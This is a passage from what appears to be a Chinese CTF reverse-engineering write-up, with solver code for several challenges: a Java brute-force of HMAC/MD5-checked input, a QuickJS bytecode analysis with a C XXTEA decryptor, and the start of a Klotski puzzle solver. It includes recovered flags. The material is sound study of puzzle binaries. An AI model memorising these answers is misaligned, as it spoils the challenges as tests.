class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.GeneralSecurityException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Mac;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[][] a;</span><br><span class="line">        String[] c;</span><br><span class="line">        a = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;<span class="string">&quot;WIgD1ZNZ0ilJqFpw&quot;</span>.getBytes(), <span class="string">&quot;4811tjOZjoiXpjdq&quot;</span>.getBytes(), <span class="string">&quot;ALFjcgztxnUaC89v&quot;</span>.getBytes(), <span class="string">&quot;ZgHzTu79Zwhoi0PB&quot;</span>.getBytes(), <span class="string">&quot;UYBfajKYrDFE1zJs&quot;</span>.getBytes(), <span class="string">&quot;yr4PBIjlJg89FpP3&quot;</span>.getBytes(), <span class="string">&quot;SFHqaTYDf7EeEevX&quot;</span>.getBytes(), <span class="string">&quot;gUwrqaE3nCxKr4Du&quot;</span>.getBytes()&#125;;</span><br><span class="line">        c = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;fc7466e55fbf37b1&quot;</span>, <span class="string">&quot;78b0be39e63b6837&quot;</span>, <span class="string">&quot;c2f9c805d0442203&quot;</span>, <span class="string">&quot;c11a61bb60d79dab&quot;</span>, <span class="string">&quot;869e650ee55bd9f6&quot;</span>, <span class="string">&quot;f2dda5fc021fe2bf&quot;</span>, <span class="string">&quot;305044db48fe6174&quot;</span>, <span class="string">&quot;d6659b5e2d1059f8&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> v4 = <span class="number">0</span>;</span><br><span class="line">        MessageDigest hhh = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(v4 &lt; a.length) &#123;</span><br><span class="line">            System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                hhh = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(NoSuchAlgorithmException v1_1) &#123;</span><br><span class="line">                v1_1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            hhh.update(a[v4]);</span><br><span class="line">            a[v4] = hhh.digest();</span><br><span class="line">            System.out.println(a[v4]);</span><br><span class="line">            ++v4;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String v0_1;</span><br><span class="line">        <span class="keyword">byte</span>[] s;</span><br><span class="line">        <span class="keyword">int</span> a1, a2, a3, a4, calc = <span class="number">0</span>;</span><br><span class="line">        s = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x4</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (a1 = <span class="number">71</span>; a1 &lt; <span class="number">127</span>; a1++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (a2 = <span class="number">65</span>; a2 &lt; <span class="number">127</span>; a2++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (a3 = <span class="number">76</span>; a3 &lt; <span class="number">127</span>; a3++) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (a4 =<span class="number">70</span>; a4 &lt; <span class="number">127</span>; a4++) &#123;</span><br><span class="line">                        s[<span class="number">0</span>] = (<span class="keyword">byte</span>) a1;</span><br><span class="line">                        s[<span class="number">1</span>] = (<span class="keyword">byte</span>) a2;</span><br><span class="line">                        s[<span class="number">2</span>] = (<span class="keyword">byte</span>) a3;</span><br><span class="line">                        s[<span class="number">3</span>] = (<span class="keyword">byte</span>) a4;</span><br><span class="line"></span><br><span class="line">                        v0_1 = func(s, a[<span class="number">0</span>]);</span><br><span class="line">                        System.out.println(<span class="string">&quot;no &quot;</span> + s[<span class="number">0</span>] + <span class="string">&quot; &quot;</span> + s[<span class="number">1</span>] + <span class="string">&quot; &quot;</span> + s[<span class="number">2</span>] + <span class="string">&quot; &quot;</span> + s[<span class="number">3</span>] + <span class="string">&quot; &quot;</span> + v0_1.substring(<span class="number">0</span>, <span class="number">16</span>) + <span class="string">&quot; &quot;</span> + c[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (v0_1.substring(<span class="number">0</span>, <span class="number">16</span>).equals(c[<span class="number">7</span>])) &#123;</span><br><span class="line">                            System.out.println(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">                                System.out.print(s[i]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            System.exit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] b;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        b = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">0xAF</span>, <span class="number">0xA1</span>, <span class="number">0xA4</span>, <span class="number">170</span>, <span class="number">0xA5</span>, <span class="number">0xAE</span>, <span class="number">0xA0</span>, <span class="number">0xA3</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;b.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.print(b[i]);</span><br><span class="line">            System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            System.out.print((b[i]^<span class="number">0xab</span>) &gt;&gt;&gt; <span class="number">3</span> &amp; <span class="number">1</span>);</span><br><span class="line">            System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            System.out.println((b[i]^<span class="number">0xab</span>)&amp;<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        0 4 SHA-256  fc7466e55fbf37b1</span></span><br><span class="line"><span class="comment">//        1 2 HmacSha512 78b0be39e63b6837</span></span><br><span class="line"><span class="comment">//        1 7 HmacSha512 c2f9c805d0442203</span></span><br><span class="line"><span class="comment">//        0 1 MD5       c11a61bb60d79dab</span></span><br><span class="line"><span class="comment">//        1 6 HmacSha512  869e650ee55bd9f6</span></span><br><span class="line"><span class="comment">//        0 5 SHA-384   f2dda5fc021fe2bf</span></span><br><span class="line"><span class="comment">//        1 3 HmacSha512  305044db48fe6174</span></span><br><span class="line"><span class="comment">//        1 0 HmacSha512  d6659b5e2d1059f8</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">func</span><span class="params">(<span class="keyword">byte</span>[] arg2, <span class="keyword">byte</span>[] arg3)</span> </span>&#123;</span><br><span class="line">        String v0 = <span class="string">&quot;HmacSha512&quot;</span>;</span><br><span class="line">        String v2_2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SecretKeySpec v1 = <span class="keyword">new</span> SecretKeySpec(arg3, v0);</span><br><span class="line">            Mac v3 = Mac.getInstance(v0);</span><br><span class="line">            v3.init(((Key) v1));</span><br><span class="line">            v3.update(arg2);</span><br><span class="line">            <span class="keyword">for</span> (v2_2 = <span class="keyword">new</span> BigInteger(<span class="number">1</span>, v3.doFinal()).toString(<span class="number">16</span>); v2_2.length() &lt; <span class="number">0x20</span>; v2_2 = <span class="string">&quot;0&quot;</span> + v2_2) &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidKeyException v2) &#123;</span><br><span class="line">            ((GeneralSecurityException) v2).printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException v2_1) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v2_2;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后会得到8组数据。</p><pre><code>0x5f,0x38,0x40,0x50,0x35,0x31,0x5f,0x48,0x7d,0x50,0x31,0x31,0x7b,0x48,0x40,0x35,0x43,0x5f,0x35,0x35,0x50,0x31,0x4e,0x33,0x33,0x48,0x37,0x5f,0x47,0x41,0x4c,0x46,</code></pre><p>这就设计到&amp;0x7f的问题了。一些数需要加0x80，一些数有不需要，所以我直接手动控制，来得到那个v10，看哪种情况满足条件和题目中a.b数组会产生一样的效果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> v9;</span><br><span class="line">        <span class="keyword">int</span> v10;</span><br><span class="line">        <span class="keyword">byte</span>[] v7_1;</span><br><span class="line">        v7_1=<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">0x47</span>,<span class="number">0x41</span>,<span class="number">0x4c</span>,<span class="number">0x46</span>&#125;;</span><br><span class="line">        v7_1[<span class="number">0</span>]+=<span class="number">0x80</span>;</span><br><span class="line"><span class="comment">//       v7_1[1]+=0x80;</span></span><br><span class="line"><span class="comment">//        v7_1[2]+=0x80;</span></span><br><span class="line"><span class="comment">//        v7_1[3]+=0x80;</span></span><br><span class="line"></span><br><span class="line">        v9 = <span class="number">0</span>;</span><br><span class="line">        v10 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(v9 &lt; v7_1.length) &#123;</span><br><span class="line">            v10 = v10 &lt;&lt; <span class="number">1</span> | (v7_1[v9] &amp; <span class="number">0x80</span>) &gt;&gt;&gt; <span class="number">7</span>;</span><br><span class="line">            v7_1[v9] = ((<span class="keyword">byte</span>)(v7_1[v9] &amp; <span class="number">0x7F</span>));</span><br><span class="line"></span><br><span class="line">            ++v9;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(v10);</span><br><span class="line">        System.out.print(v10 &gt;&gt;&gt; <span class="number">3</span> &amp; <span class="number">1</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        System.out.println(v10&amp;<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到，输入后就会得到flag。</p><pre><code># 0x5f,0x38+0x80,0x40,0x50  5FB84050## 0x35+0x80,0x31,0x5f+0x80,0x48  B531DF48## 0x7d,0x50,0x31,0x31,  +0x80   FDD0B1B1## 0x7b,0x48,0x40,0x35+0x80   7B4840B5## 0x43+0x80,0x5f+0x80,0x35+0x80,0x35   C3DFB535## 0x50,0x31+0x80,0x4e,0x33+0x80   50B14EB3## 0x33+0x80,0x48,0x37+0x80,0x5f+0x80  B348B7DF## 0x47+0x80,0x41,0x4c,0x46   C7414C46</code></pre><h2 id="fastjs"><a href="#fastjs" class="headerlink" title="fastjs"></a>fastjs</h2><p>赛后来做的，这种题型已经是第三次见了，所以准备来搞一搞。</p><p>看雪，和Mas0n师傅的博客里面都有详细讲解如何解这种题。</p><p><a href="https://bbs.pediy.com/thread-259014.htm#msg_header_h1_2">看雪</a></p><p><a href="https://blog.shi1011.cn/ctf/1734">Mas0n</a></p><p>实际上就是利用quickjs来将一个js文件弄成.c文件，然后将用gcc编译c文件成为exe。</p><p>比如说，GitHub上quickjs项目example的hello.js，弄成c文件后就是如下的结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* File generated automatically by the QuickJS compiler. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;quickjs-libc.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint32_t</span> qjsc_hello_size = ???;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span> qjsc_hello[size] = &#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> JSContext *<span class="title">JS_NewCustomContext</span><span class="params">(JSRuntime *rt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  JSContext *ctx = JS_NewContextRaw(rt);</span><br><span class="line">  <span class="keyword">if</span> (!ctx)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  JS_AddIntrinsicBaseObjects(ctx);</span><br><span class="line">  JS_AddIntrinsicDate(ctx);</span><br><span class="line">  JS_AddIntrinsicEval(ctx);</span><br><span class="line">  JS_AddIntrinsicStringNormalize(ctx);</span><br><span class="line">  JS_AddIntrinsicRegExp(ctx);</span><br><span class="line">  JS_AddIntrinsicJSON(ctx);</span><br><span class="line">  JS_AddIntrinsicProxy(ctx);</span><br><span class="line">  JS_AddIntrinsicMapSet(ctx);</span><br><span class="line">  JS_AddIntrinsicTypedArrays(ctx);</span><br><span class="line">  JS_AddIntrinsicPromise(ctx);</span><br><span class="line">  JS_AddIntrinsicBigInt(ctx);</span><br><span class="line">  <span class="keyword">return</span> ctx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  JSRuntime *rt;</span><br><span class="line">  JSContext *ctx;</span><br><span class="line">  rt = JS_NewRuntime();</span><br><span class="line">  js_std_set_worker_new_context_func(JS_NewCustomContext);</span><br><span class="line">  js_std_init_handlers(rt);</span><br><span class="line">  JS_SetModuleLoaderFunc(rt, <span class="literal">NULL</span>, js_module_loader, <span class="literal">NULL</span>);</span><br><span class="line">  ctx = JS_NewCustomContext(rt);</span><br><span class="line">  js_std_add_helpers(ctx, argc, argv);</span><br><span class="line">  js_std_eval_binary(ctx, qjsc_hello, qjsc_hello_size, <span class="number">0</span>);</span><br><span class="line">  js_std_loop(ctx);</span><br><span class="line">  JS_FreeContext(ctx);</span><br><span class="line">  JS_FreeRuntime(rt);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这和我们将题目文件拖到ida如出一辙。<br><img src="https://i.loli.net/2021/10/27/R34u5vt1gwaSF9I.png"><br>然后我们采用文章中的方法来将题目的opcode弄成字节码。</p><p>得到，有点长，不贴完了。</p><pre><code>0000:  02 3a                    58 atom indexes &#123;1&quot;long2str&quot;1&quot;str2long&quot;1&quot;sdfsfsdf&quot;1&quot;str2Hex&quot;1&quot;hex2str&quot;·········</code></pre><p>​<br>            put_loc0 0: “<ret>“<br>            get_var_undef arguments<br>            typeof_is_undefined<br>            if_true8 203<br>            get_var arguments<br>            dup<br>            put_var args<br>            put_loc0 0: “<ret>“<br>            goto8 215<br>      203:  push_atom_value error<br>            dup<br>            put_var args<br>            put_loc0 0: “<ret>“<br>      215:  get_var main<br>            get_var args<br>            call1 1<br>            set_loc0 0: “<ret>“<br>            return</p><pre><code>                            &#125;</code></pre><p>然后手搓还原，只不过也太多了，暂时不知道能用什么工具反编译不，实际上可以半猜半分析。</p><p>可以看到里面有base64表 推测base64加密，有dealt，有e，xxtea。</p><p>然后尝试去解。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void decrypt(unsigned int *code ,unsigned int *key ,unsigned int n)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int next,end,sum;</span><br><span class="line">    unsigned int rounds,e,delta&#x3D;2654435769;</span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    rounds&#x3D;6+52&#x2F;n;</span><br><span class="line">    sum&#x3D;rounds*delta;    </span><br><span class="line">    next&#x3D;code[0];&#x2F;&#x2F;设置next为code的第一个 </span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">        e&#x3D;(sum&gt;&gt;2)&amp;3;</span><br><span class="line">        for(i&#x3D;n-1;i&gt;0;i--)&#x2F;&#x2F;解密最后一个到第二个</span><br><span class="line">        &#123;</span><br><span class="line">            end&#x3D;code[i-1];</span><br><span class="line">            code[i]-&#x3D;(( (end&gt;&gt;5^next&lt;&lt;2)  + (next&gt;&gt;3^end&lt;&lt;4) ) ^ ( (sum^next) + (key[(i&amp;3)^e]^end) ));</span><br><span class="line">            next&#x3D;code[i];</span><br><span class="line">        &#125;</span><br><span class="line">        end&#x3D;code[n-1];</span><br><span class="line">        code[0]-&#x3D;(( (end&gt;&gt;5^next&lt;&lt;2) + (next&gt;&gt;3^end&lt;&lt;4) ) ^ ( (sum^next) +(key[i&amp;3^e]^end) ));</span><br><span class="line">        next&#x3D;code[0];</span><br><span class="line">        sum-&#x3D;delta;</span><br><span class="line">    &#125;while(--rounds);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int flag[2]&#x3D;&#123;1,2&#125;,key[4]&#x3D;&#123;0x745f6f6e, 0x676e6968, 0x5f73695f, 0x65757274&#125;;</span><br><span class="line">    unsigned int n&#x3D;14;</span><br><span class="line">    unsigned int code[14]&#x3D;&#123;0xced0ae05,0xb5801f44,0x4caf36bc,0xfc098569,0x71c9c36c,0xe53d3546,0xbe6a5ca9,0xa7d47fa0,0xd8320907,0x622dc36a,0x91a57286,0x2397e523,0xff5ddb31,0x627305e7&#125;;</span><br><span class="line">int i;</span><br><span class="line"> </span><br><span class="line">    decrypt(code,key,n);</span><br><span class="line">    printf(&quot;%x %x\n&quot;,code[0],code[1]);</span><br><span class="line">    for(i&#x3D;0;i&lt;14;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c%c%c%c&quot;,*((char*)&amp;code[i]+0),*((char*)&amp;code[i]+1),*((char*)&amp;code[i]+2),*((char*)&amp;code[i]+3));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;ZmxhZ3tmYzVlMDM4ZDM4YTU3MDMyMDg1NDQxZTdmZTcwMTBiMH0&#x3D;4</span><br></pre></td></tr></table></figure><p>解下base64得到flag{fc5e038d38a57032085441e7fe7010b0}</p><h2 id="showyourflag"><a href="#showyourflag" class="headerlink" title="showyourflag"></a>showyourflag</h2><p>初步分析可以知道，这个程序是加密文件，然后生成一个文件。</p><p>命令行参数</p><pre><code>showyourflag [flie] [encoedfile]</code></pre><p>当时和师傅一起做题时，只分析出来了部分，没分析完，可以确定是个png文件，但还需要分析那个主要加密函数，后面有时间来细致分析(看情况)。</p><h2 id="gogogog"><a href="#gogogog" class="headerlink" title="gogogog"></a>gogogog</h2><p>一个华容道的题，开始是蓝帽杯决赛的一个题，后面也遇到了两次，还是一模一样的。。。。所以直接秒了。</p><p>一个解华容道的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span 